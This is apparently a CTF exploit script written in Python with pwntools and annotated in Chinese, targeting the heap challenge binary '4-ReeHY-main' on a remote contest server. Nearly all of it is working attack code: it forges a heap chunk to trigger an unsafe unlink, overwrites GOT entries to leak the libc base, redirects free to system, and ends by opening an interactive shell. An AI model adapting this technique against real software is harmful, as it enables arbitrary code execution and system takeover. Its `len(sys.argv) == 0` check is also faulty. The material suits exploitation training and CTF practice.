# encoding: utf-8
from pwn import *
import sys


#context.log_level = "debug"  # 执行时输出debug的信息


def Welcome():
    p.recvuntil("$ ")
    p.sendline("mutepig")


def Add(size, id, content):
    p.recvuntil("$ ")
    p.sendline("1")
    p.recvuntil("size\n")
    p.sendline(str(size))
    p.recvuntil("cun\n")
    p.sendline(str(id))
    p.recvuntil("content\n")
    p.sendline(content)


def Remove(id):
    p.recvuntil("$ ")
    p.sendline("2")
    p.recvuntil("dele\n")
    p.sendline(str(id))


def Edit(id, content):
    p.recvuntil("$ ")
    p.sendline("3")
    p.recvuntil("edit\n")
    p.sendline(str(id))
    p.recvuntil("content\n")
    p.send(content)


if __name__ == "__main__":  # 文件作为脚本直接执行，而import到其他脚本中不会被执行的。
    if len(sys.argv) == 0:  # sys.argv表示当前模块的名字，1==len(sys.argv)。相当于1==['4Ree.py']
        p = process("./4-ReeHY-main")
        libc = ELF('libc.so.6')
    else:
        p = remote('111.198.29.45', 37996)
        libc = ELF('ctflibc.so.6')
    # gdb.attach(proc.pidof(p)[0],"b *0x400c29\n")
    # +==================INIT=====================================
    elf = ELF('4-ReeHY-main')
    libc_atoi = libc.symbols['atoi']  # atoi的实际偏移
    libc_system = libc.symbols['system']
    libc_binsh = next(libc.search("/bin/sh"))  # next()理解成找到的第一个/bin/sh
    free_got = elf.got['free']
    atoi_got = elf.got['atoi']
    puts_plt = elf.plt['puts']
    heap_addr = 0x602100  #
    # +==================INIT=====================================
    print hex(free_got)
    Welcome()
    Add(512, 0, "/bin/sh\x00")  # 第0个chunk，先存/bin/sh
    Add(512, 1, "1")
    Add(512, 2, "2")
    Add(512, 3, "3")
    Remove(3)
    Remove(2)  # free掉第三第四个chunk
    payload = p64(0) + p64(512 + 1) + p64(heap_addr - 0x18) + p64(heap_addr - 0x10) + 'A' * (512 - 0x20) + p64(512) + p64(512)
    #  申请一个大的chunk，来构造两个小的chunk，前0x20构造堆头，对于后面一个chunk表示的是前一个chunk是空闲的
    #  p64(512) + p64(512) 表示的是 prev_size 和size
    Add(1024, 2, payload)  # 传入payload位于第三个chunk
    Remove(3)  # 这里产生产生unlink 操作，向后合并块，此时伪造的第一个chunk的用户指针ptr指向ptr-0x18处
    Edit(2, '1' * 0x18 + p64(free_got) + p64(1) + p64(atoi_got) + "\n")
    # 因为ptr指向ptr-0x18，ptr本身存储在.bss段，这里是在bss里面
    # 改写存储ptr的内存空间的内容为free_got,原来存储的是ptr-0x18,现在是free_got
    # 在bss段内，p64(1),为填充部分,atoi_got改写的是伪造的第二个chunk的用户指针
    Edit(2, p64(puts_plt))  # 这里是将got表中存储free_got地址的内存空间的内容改为puts_plt
    Remove(3)  # 伪造的第二个chunk的内容改成了指向atoi_got,那么现在free(chunk3),变成了puts(chunk3)
    atoi_addr = u64(p.recv(6)+'\x00'*2) & 0xffffffffffff  # 获取后面12位地址
    base_addr = atoi_addr - libc_atoi
    system_addr = base_addr + libc_system
    log.success("systebm:" + hex(system_addr))  # 打印函数
    Edit(2, p64(system_addr))  # 这里自然是将got表的puts_got改成sys_got
    Remove(0)  # 第一个chunk中放入了/bin/sh ，我们在got表中修改了free为system，那么free(/bin/sh),就成了system(/bin/sh)
    p.interactive()
